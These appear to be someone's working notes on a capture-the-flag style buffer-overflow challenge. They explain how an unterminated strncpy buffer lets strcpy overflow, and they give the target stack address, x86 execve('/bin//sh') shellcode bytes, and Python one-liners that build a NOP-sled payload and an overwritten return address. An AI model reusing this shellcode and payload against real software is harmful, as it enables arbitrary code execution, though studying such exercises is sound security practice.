f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


Sending 20 a's in each read makes it crash on 0x61616161
19 is okay
20 in the first one make it crash on same address
A lot more in the second is fine

The first one makes it crash tho

So can we pass the address in the first to a buffer with a shellcode ?


Ok so yeah, bascially if the first input is less than 20, the \n gets replaced by a \0 sop that strcpy finishes properly.
By sending a string that 20 or more, even if the \n is replaced it won't be copied into the buffer by the strncpy, so buffer1 is a non terminated string, and as such, strcpy will copy both buffer1 and buffer2 into str

There is another strchr that tries to replace the end of buffer1 in str to a space instead of \0

It's weird bcz strcat needs a terminated string and replacing it with a space will create issues


That doesnt matter since we can put stuff in the big buffer that's used to read and then redirect call to it

it's at 0xbf ff e6 80
\x80\xe6\xff\xbf
So we need a shellcode in the first read, but we need to put it far enough for it not to be overwritten by our second call 


\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80 ; 21 len


Our first arg looks something like this
python -c 'print ( "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'

So lets remember that the first 20 x\90 will be copied into our final string

The second will look somethink like 

python -c 'print( "abcdefghi" + "\xd0\xe6\xff\xbf" + "nopqrst" )'
